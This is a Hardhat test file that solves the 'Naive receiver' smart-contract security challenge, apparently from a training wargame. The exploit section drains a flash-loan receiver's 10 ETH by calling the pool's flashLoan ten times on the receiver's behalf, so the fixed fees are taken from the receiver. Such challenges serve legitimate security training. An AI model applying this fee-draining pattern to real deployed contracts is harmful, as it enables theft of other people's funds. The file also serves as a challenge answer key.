const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // connect as the attacker.
        this.pool = this.pool.connect(attacker);
        this.receiver = this.receiver.connect(attacker);
        
        // get the initial balance of the pool
        var poolBalance = await ethers.provider.getBalance(this.pool.address);
        // get the initial balance of the receiver
        var receiverBalance = await ethers.provider.getBalance(this.receiver.address);

        console.log("Initial pool balance: " + poolBalance);
        console.log("Initial receiver balance: " + receiverBalance);

        for (var i = 0; i < 10; i++) {

            // flashLoan on the receiver's address until no ether left
            await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
            // this was the issue; anyone could do a flashLoan on somebody else's behalf(as long as restrictions were met) and hence drain the account.

            receiverBalance = await ethers.provider.getBalance(this.receiver.address);
            console.log("#" + i + " flashloan. current receiver balance: " + receiverBalance);
        }

        // get the updated balance of the pool
        poolBalance = await ethers.provider.getBalance(this.pool.address);
        console.log("Updated pool balance: " + poolBalance);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
